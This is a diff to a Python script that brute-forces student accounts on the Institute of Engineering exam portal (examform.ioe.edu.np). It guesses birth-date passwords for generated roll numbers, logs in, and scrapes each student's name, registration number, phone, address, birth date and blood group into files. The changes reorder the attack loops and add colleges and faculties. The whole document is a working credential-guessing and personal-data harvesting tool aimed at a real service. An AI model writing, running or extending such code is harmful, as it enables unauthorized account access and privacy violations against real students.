@@ -58,21 +58,29 @@ def get_college():
     os.system('clear')
     icon()
     college_map = {
-        1: "PUR",
+        1: "THA",
         2: "PUL",
-        3: "PAS"
+        3: "PUR",
+        4: "PAS"
     }
+
+    #TODO Add Thapathali code.
+    
     print('''Enter the college of the students:
-    Purwanchal     ---  1
+    Thapathali     ---  1
     Pulchowk       ---  2
-    Paschimanchal  ---  3
+    Purwanchal     ---  3
+    Paschimanchal  ---  4
     Exit           ---  99
     ''')
+
+
+
     while True:
         cllg = int(input("Enter your choice: "))
         if cllg == 99:
             sys.exit()
-        if cllg not in range(1, 4):
+        if cllg not in college_map:
             print("\nPlease enter a valid input \n")
         else:
             return (college_map[cllg])
@@ -115,21 +123,23 @@ def get_faculty():
     os.system('clear')
     icon()
     faculty_map = {
-        1: "BCT",
-        2: "BAG",
-        3: "BAR",
-        4: "BEL",
-        5: "BME",
-        6: "BEI"
+        1: "BAG",
+        2: "BAR",
+        3: "BCE",
+        4: "BCT",
+        5: "BEI",
+        6: "BEL",
+        7: "BME"
     }
     while True:
         print('''Enter the faculty of the students:
-        Computer Engineering    (BCT)  ---  1
-        Agriculture Engineering (BAG)  ---  2
-        Architecture            (BAR)  ---  3
-        Electrical Engineering  (BEL)  ---  4
-        Mechanical Engineering  (BME)  ---  5
-        Electronics Engineering (BEI)  ---  6
+        Agriculture Engineering (BAG)  ---  1
+        Architecture            (BAR)  ---  2
+        Civil Engineering       (BCE)  ---  3
+        Computer Engineering    (BCT)  ---  4
+        Electronics Engineering (BEI)  ---  5
+        Electrical Engineering  (BEL)  ---  6
+        Mechanical Engineering  (BME)  ---  7
         Back ---  00
         Exit ---  99
         ''')
@@ -154,7 +164,7 @@ def dataFile(college, batch, faculty,getYear):
     
     #creates the name for the json file
     data_file = "Json_files/"+college+batch+faculty+".json"
-    if not os.path.exists("Json files"):
+    if not os.path.exists("Json_files"):
         os.system("mkdir Json_files")
     
 
@@ -200,58 +210,58 @@ def dataFile(college, batch, faculty,getYear):
 
 
 # Loops over the whole year and all the students to create username and password
-
-def run(college, batch, faculty, noOfStudents, data,getYear):
-   
+def run(college, batch, faculty, noOfStudents, data, getYear):
     print("Running! Have patience :)    ...\n")
-    #get the starting month and roll number form the file so that you can start where you left before.
 
+    # Get the starting month and roll number from the file so that you can start where you left off before.
     initialMonth = data["dataInFile"][0][f'{getYear}']["checkedMonth"]
     initialRoll = data["dataInFile"][0][f'{getYear}']["checkedRoll"]
 
-    #loop through the months starting from the month that you left before.
-    for month in range(initialMonth, 13):
-        data["dataInFile"][0][f'{getYear}']["checkedMonth"]=month
-        print(f"\b\b\b\bCurrently on month {month}")
+    # Loop through the students
+    for students in range(initialRoll, noOfStudents):
+        rep = True
+        updateData(initialMonth, students, data, getYear)
+        if students not in data["dataInFile"][0]["arrayData"]:
+            print(f"\b\b\b\bCurrently on student {students}")
+        
 
-        #updates the values in the json file everytime one month is completed
-        updateData(month,1,data,getYear)
-
-        #creating password for different months.
-        if month < 10:
-            passMonth = getYear+"-0"+str(month)+"-"
+        if students < 10:
+            roll = college + batch + faculty + "00" + str(students)
+        elif(students<100):
+            roll = college + batch + faculty + "0" + str(students)
         else:
-            passMonth = getYear+"-"+str(month)+"-"
+            roll = college + batch + faculty+ str(students)
+        # Loop through the months starting from the month that you left off before.
+        for month in range(initialMonth, 13):
+            data["dataInFile"][0][f'{getYear}']["checkedMonth"] = month
+            print("\r" + str(month).zfill(2), end=" ")
+            # Update the values in the JSON file every time one month is completed
+            updateData(month, students, data, getYear)
 
-
-        #creates different roll number to attack the month
-        for students in range(initialRoll, noOfStudents):
-            rep = True
-            updateData(month,students,data,getYear)
-            print("\r" + str(students).zfill(3), end=" ")
-            if students < 10:
-                roll = college+batch+faculty+"00"+str(students)
+            # Create password for different months.
+            if month < 10:
+                passMonth = getYear + "-0" + str(month) + "-"
             else:
-                roll = college+batch+faculty+"0"+str(students)
+                passMonth = getYear + "-" + str(month) + "-"
 
             if students not in data["dataInFile"][0]["arrayData"]:
-                
                 for days in range(1, 32):
                     if days < 10:
-                        password = passMonth+"0"+str(days)
+                        password = passMonth + "0" + str(days)
                     else:
-                        password = passMonth+str(days)
-                    if (rep):
-
-                        #function that tries to login to the website
+                        password = passMonth + str(days)
+                    if rep:
+                        # Function that tries to login to the website
+                        
                         login(roll, password, data, students)
                     else:
                         break
             else:
                 continue
-        initialRoll=1
-    initialMonth=1
-            
+
+            initialRoll = 1  # Reset initialRoll for the next run
+
+        initialMonth = 1  # Reset initialMonth for the next student
 
 
 
@@ -290,9 +300,8 @@ def login(username, password, data, students):
         br.back()
     if json.loads(response)['IsSuccess']:
         rep= False
-        print("\b\b\b")
+        print("\r"+"\b\b\b\b         ")
         br.open("https://examform.ioe.edu.np/StudentPortal/Dashboard")
-        
         #calling function to find the details and write it in files.
         details(data, students)
 
@@ -306,20 +315,20 @@ def details(data, students):
     #reads the response
     html = br.response().read()
     savedData = data["dataInFile"]
-    #clearing the history and cookies so that when you send request in the website again it wouldnt login you automatically in the previous account.
+    #clearing the history and cookies so that when you send request in the website again it wouldnt login you automatically using the previous account.
     br.clear_history()
     cookie_jar.clear()
     sp = soup(html, 'html.parser')
 
-    #regression to find the data stored in javascript object in source code of the website.
+    #regular expression to find the data stored in javascript object in source code of the website.
     match = re.search(r'var data = ({.*?});', str(sp))
     if match:
         varfoundData = match.group(1)
         foundData = json.loads(varfoundData)
 
     #prints the student details in the terminal
-        print(f'''\n
-"--------------------------------")
+        print(f'''
+--------------------------------
 Name :{foundData['FullName']}
 Registration No: {foundData['RegistrationNo']}
 College: {foundData['College']}
@@ -327,7 +336,7 @@ Phone No: { foundData['ContactNo']}
 Address: {foundData['MunVdc']} {foundData['WardNo']}
 Birth Date: {foundData['BirthDateBs']} | {foundData['BirthDateAd'][0:10]}
 Blood Group: {foundData['BloodGroup']}
---------------------------------"
+--------------------------------
 \n''')
 
     #making object of the found data in desired format
@@ -358,8 +367,8 @@ Name : {foundData['FullName']}
 College: {foundData['College']} 
 Phone No: {foundData['ContactNo']} 
 Address: {foundData['MunVdc']} {foundData['WardNo']} 
-Birth Date: {foundData['BirthDateBs']} | {foundData['BirthDateAd']}  \n
-Blood Group: {str(foundData['BloodGroup'])}  \n
+Birth Date: {foundData['BirthDateBs']} | {foundData['BirthDateAd']}  
+Blood Group: {str(foundData['BloodGroup'])}  
 ------------------------------------
             ''')
         file.close()
